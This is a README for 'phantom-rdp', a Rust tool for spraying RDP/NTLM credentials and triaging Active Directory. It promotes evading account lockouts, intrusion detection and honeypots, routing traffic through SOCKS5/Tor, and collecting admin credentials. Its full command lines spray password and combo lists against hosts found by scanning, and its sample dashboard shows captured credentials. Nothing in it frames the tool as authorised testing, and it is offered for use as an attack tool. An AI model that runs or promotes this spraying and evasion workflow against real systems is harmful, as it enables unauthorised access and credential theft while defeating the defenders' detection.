# ⚡ phantom-rdp

> **Next-Generation High-Speed RDP CredSSP/NTLM Credential Sprayer & Active Directory Triager**

`phantom-rdp` is an elite, high-performance RDP Network Level Authentication (NLA) credential spraying engine engineered in modern asynchronous Rust. Built from the ground up to provide maximum throughput, stealth, and operational efficiency compared to legacy tools like `NLBrute` and `Crowbar`.

Directly integrates with **`phantom-scan`** output lists (`NLA.txt`).

---

## 🚀 Key Advantages Over Legacy Sprayers

| Feature | Legacy Sprayers (NLBrute / Hydras) | **`phantom-rdp`** |
| :--- | :--- | :--- |
| **Active Directory Lockout Evasion** | Sprays sequential passwords against the same host $\to$ account locked in 3 tries | **Horizontal target spraying** + **Subnet interleaving** + strict **`--max-tries 2`** limit |
| **Subnet IDS Evasion** | Hammers same IP range repeatedly, tripping IDS/firewalls | **Dynamic `/24` (IPv4) & `/48` (IPv6) subnet interleaving** |
| **Honeypot Detection** | Floods `good.txt` with fake catch-all daemons (PyRDP, Dionaea) | **Canary authentication traps** disqualify fake RDP daemons |
| **Domain & OS Triage** | Requires pre-knowing domain name or leaves it blank | **Automatic Active Directory domain, NetBIOS name, & OS build extraction** from NTLM Challenge |
| **Proxy Tunneling** | Disconnects or drops stream on complex auth | **Real SOCKS5 tunneling (`tokio-socks`)** preserving full CredSSP handshake |
| **Input Compatibility** | Manual formatting needed | **Native intake of `phantom-scan` results (`NLA.txt`)** |
| **Memory & Concurrency** | Allocates heavy state; can stall on tarpits | **`mimalloc` allocator + async channels + pre-computed NT hashes** |

---

## 🛡️ Anti-Account-Lockout & Evasion Engine

In enterprise Windows environments, Active Directory Account Lockout thresholds typically lock user accounts after **3 to 5 failed attempts within 10–30 minutes**. `phantom-rdp` completely bypasses lockout traps:

1. **Horizontal Target Spraying**:
   - Tests Password #1 across **all** targets before attempting Password #2 on any host.
   - When spraying 5,000 hosts, hours pass before Host #1 is revisited, allowing the bad-password lockout window to expire naturally.
2. **Subnet `/24` Interleaving (`--no-interleave` to disable)**:
   - Shuffles and spaces probes across different network subnets so network edge firewalls never detect an authentication burst.
3. **Hardened Max Attempts Guard (`--max-tries 2`)**:
   - Enforces a maximum attempt threshold per host (default: 2), ensuring your source IP or user never crosses the domain lockout limit.
4. **Lockout Sentinel**:
   - Detects `STATUS_ACCOUNT_LOCKED_OUT (0xC0000234)` or `STATUS_PASSWORD_MUST_CHANGE (0xC0000224)` and immediately retires that host/user to prevent further alert noise.

---

## 🍯 Honeypot Canary Traps

`phantom-rdp` features automated detection of synthetic RDP honeypots (e.g. PyRDP, Dionaea, RDPY):
- Upon receiving a successful authentication response, `phantom-rdp` instantly probes the target with a randomized 24-character bogus credential.
- If the server accepts both, it is flagged as a 100% synthetic catch-all honeypot, logged to `honeypots.txt`, and disqualified from valid hits.

---

## 🏢 Automated Active Directory & OS Telemetry

When the server sends the NTLM Type-2 Challenge, `phantom-rdp` parses the ASN.1 / NTLM `TargetInfo` AV_PAIRS structure in real time:
- **NetBIOS Domain Name** (e.g., `CORP`)
- **DNS Domain Name** (e.g., `corp.internal.local`)
- **Computer Name** (e.g., `DC01`, `FILESRV`)
- **DNS Tree Name** (e.g., `internal.local`)
- **Windows OS Version & Build** (e.g., `Server 2022 (20348)`, `Windows 11 (22621)`)

### Output Files (`./results/`):
- `good.txt` — Standard format: `IP:PORT@DOMAIN\USER:PASS`
- `admin.txt` — Confirmed `Administrator` or domain admin credentials
- `detailed.txt` — Complete diagnostic card with OS version, Computer Name, Domain, Forest, and latency
- `honeypots.txt` — Disqualified honeypot servers

---

## 🖥️ Live TUI Dashboard

```
╔════════════════════════════════════════════════════════════════════════════╗
║        ⚡ PHANTOM-RDP v1.0.0 — Elite Stealth RDP Sprayer & Triager ⚡      ║
╠════════════════════════════════════════════════════════════════════════════╣
║  Elapsed: 00:02:15 | ETA: 00:04:30 | Speed: 382.4 checks/s                 ║
║  [████████████████████░░░░░░░░░░░░░░░░░░░░]  45.2% (45,200 / 100,000)      ║
╠════════════════════════════════════════════════════════════════════════════╣
║  ✅ Goods: 18 | 🍯 Honeypots: 6 | ❌ Fails: 45,023 | 🔒 Lockouts: 4 | 🛡️ Guarded: 149
╠════════════════════════════════════════════════════════════════════════════╣
║  📡 Live Real-Time Hits & Telemetry:                                       ║
║  [✅ HIT] 10.10.14.5:3389 | CORP\Administrator:P@ssw0rd! | ADMIN | Server 2022 | 84ms
║  [✅ HIT] 192.168.1.50:3389 | WORKGROUP\user:Welcome1 | USER | Windows 10 | 45ms
║  [🍯 HONEYPOT] 45.33.32.18:3389 | admin:admin | Catch-All Fake RDP Disqualified
╚════════════════════════════════════════════════════════════════════════════╝
 [Ctrl+C] Gracefully Stop | Results saved in output directory
```

---

## 📖 CLI Usage & Flags

```bash
Usage: phantom-rdp [OPTIONS]

Options:
  -T, --targets <TARGETS>       Path to targets file (IP:PORT or IP, e.g. NLA.txt from phantom-scan)
  -U, --users <USERS>           Path to usernames file, or a single username
  -P, --passwords <PASSWORDS>   Path to passwords file, or a single password
  -C, --combos <COMBOS>         Path to combo file (user:pass or domain\user:pass)
  -d, --domain <DOMAIN>         Domain name (default: auto-detect from target's NTLM challenge) [default: .]
  -w, --workers <WORKERS>       Number of concurrent worker threads [default: 500]
      --timeout <TIMEOUT>       Connection and authentication timeout in ms [default: 5000]
      --max-tries <MAX_TRIES>   Max attempts per host to evade AD account lockout [default: 2]
      --no-interleave           Disable /24 subnet interleaving
      --no-canary               Disable canary honeypot detection
      --proxy <PROXY>           SOCKS5 proxy URL (e.g. socks5://127.0.0.1:1080)
      --stealth                 Stealth mode: graceful FIN teardown instead of RST
      --jitter <JITTER>         Max random micro-jitter in milliseconds between probes [default: 0]
  -o, --output <OUTPUT>         Output directory for results [default: ./results]
      --no-tui                  Disable TUI dashboard, print raw hits to stdout
      --quiet                   Quiet mode: suppress non-essential output
  -i, --interactive             Interactive wizard mode
  -h, --help                    Print help
  -V, --version                 Print version
```

---

## 🛠️ Tactical Workflow Examples

### 1. Direct Pipeline with `phantom-scan`
```bash
# 1. High-speed network scan for RDP NLA servers (creates NLA.txt)
phantom-scan -t subnets.txt -p 3389 --quick-nla

# 2. Precision spray with lockout evasion and domain triage
phantom-rdp -T NLA.txt -U users.txt -P passwords.txt -w 500 --max-tries 2
```

### 2. Combo File with SOCKS5 Proxy
```bash
phantom-rdp -T NLA.txt -C combos.txt --proxy socks5://127.0.0.1:9050 -w 200
```

### 3. Headless Scripting / CI Mode
```bash
phantom-rdp -T NLA.txt -C combos.txt --no-tui --quiet | grep -i "ADMIN"
```

### 4. Interactive Wizard Mode
Launch with no arguments or `-i` to enter the guided setup:
```bash
phantom-rdp
```

---

## 🏗️ Compilation

Build the standalone binary with full LTO:
```bash
cargo build --release
```
The compiled binary will be located at `target/release/phantom-rdp.exe`.
